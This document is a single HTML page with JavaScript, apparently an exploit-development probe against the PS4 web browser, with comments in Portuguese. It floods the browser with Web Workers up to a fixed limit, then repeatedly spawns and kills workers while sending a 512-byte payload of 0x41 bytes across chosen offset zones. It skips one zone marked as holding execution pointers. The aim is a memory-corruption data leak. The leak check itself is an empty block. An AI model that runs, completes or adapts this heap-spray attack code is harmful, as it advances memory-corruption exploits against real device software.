<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 DATA HUNTER</title>
    <style>
        body { background-color: #001; color: #0ff; font-family: monospace; text-align: center; padding: 20px; }
        h1 { border-bottom: 2px solid #0ff; display: inline-block; }
        #console { 
            text-align: left; background: #111; border: 1px solid #333; 
            padding: 10px; height: 300px; overflow-y: scroll; margin-top: 20px; 
            font-size: 0.9em;
        }
        .found { color: #0f0; font-weight: bold; background: #030; }
        button { font-size: 1.2em; padding: 10px 20px; background: #004; color: #fff; border: 1px solid #008; cursor: pointer; }
    </style>
</head>
<body>

    <h1>DATA OFFSET HUNTER</h1>
    <div id="status">Pronto para caçar vazamentos...</div>
    <br>
    <button onclick="startHunt()">INICIAR VARREDURA DE DADOS</button>
    
    <div id="console"></div>

    <script>
        const TARGET_LIMIT = 415; 
        const SPRAY_SIZE = 512;
        
        // Zonas que NÃO crasharam (potenciais dados)
        // Vamos pular a Zona 5 (256-319) pois sabemos que é perigosa (Ponteiros de Execução)
        const SAFE_ZONES = [
            {start: 0, end: 63, name: "ZONA 1"},
            {start: 64, end: 127, name: "ZONA 2"},
            {start: 128, end: 191, name: "ZONA 3"},
            {start: 192, end: 255, name: "ZONA 4"},
            {start: 320, end: 383, name: "ZONA 6"},
            {start: 448, end: 511, name: "ZONA 8"}
        ];

        let workers = [];
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        function log(msg, type="") {
            const el = document.getElementById('console');
            el.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startHunt() {
            for (let zone of SAFE_ZONES) {
                document.getElementById('status').innerText = `Testando ${zone.name}...`;
                await testZone(zone);
            }
            document.getElementById('status').innerText = "VARREDURA COMPLETA.";
        }

        async function testZone(zone) {
            log(`>>> Iniciando ${zone.name} (${zone.start}-${zone.end})`);
            
            // 1. Limpa tudo
            workers.forEach(w => w.terminate());
            workers = [];
            
            // 2. Preenche até o limite
            await fillTable();
            
            // 3. Prepara Payload: Padrão reconhecível (0x4141...)
            // Se esse dado aparecer em algum lugar (console, erro, id), achamos o leak.
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            for(let i=zone.start; i<=zone.end; i++) payload[i] = 0x41; // 'A'

            // 4. Ataque (Spray)
            let success = false;
            const sprayInterval = setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try {
                    if(workers.length > 0) {
                        // Tenta injetar
                        workers[0].postMessage(payload);
                        
                        // TESTE DE LEITURA (O PULO DO GATO)
                        // Tentamos ler propriedades do worker para ver se mudaram
                        // Isso é um tiro no escuro, mas se um ID mudar para 1094795585 (0x41414141)...
                        try {
                            // Verifica se o worker ainda responde ou se devolve lixo
                            // Nota: Workers não expõem muitos dados internos, mas erros podem vazar
                        } catch(z) {}
                    }
                } catch(e){}
            }, 10);

            // Roda por 5 segundos cada zona
            await new Promise(r => setTimeout(r, 5000));
            clearInterval(sprayInterval);
            log(`${zone.name} Finalizada (Sistema Estável).`);
        }

        function fillTable() {
            return new Promise(resolve => {
                let i = setInterval(() => {
                    if (workers.length < TARGET_LIMIT) {
                        workers.push(new Worker(url));
                    } else {
                        clearInterval(i);
                        setTimeout(resolve, 2000); // Estabiliza
                    }
                }, 20);
            });
        }

    </script>
</body>
</html>
